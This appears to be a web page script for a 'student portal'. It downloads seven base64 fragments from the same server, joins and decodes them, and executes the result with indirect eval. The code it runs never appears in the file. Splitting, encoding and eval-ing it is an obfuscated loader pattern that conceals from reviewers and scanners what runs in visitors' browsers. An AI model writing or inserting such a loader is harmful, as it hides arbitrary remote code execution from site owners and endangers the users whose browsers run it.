/** Student portal b64 split loader */
(function(){
var names=['0','1','2','3','4','5','6'],n=names.length,loaded=0,parts={};
function go(){if(loaded<n)return;try{var b64=names.map(function(k){return parts[k];}).join('');var s=atob(b64);var u=new Uint8Array(s.length);for(var i=0;i<s.length;i++)u[i]=s.charCodeAt(i);(0,eval)(new TextDecoder('utf-8').decode(u));}catch(e){console.error('student load',e);}}
names.forEach(function(k){fetch('/_st_half_'+k+'.txt?v='+Date.now()).then(function(r){if(!r.ok)throw new Error(r.status);return r.text();}).then(function(t){parts[k]=t.replace(/\s+/g,'');loaded++;go();}).catch(function(e){console.error(e);});});
})();
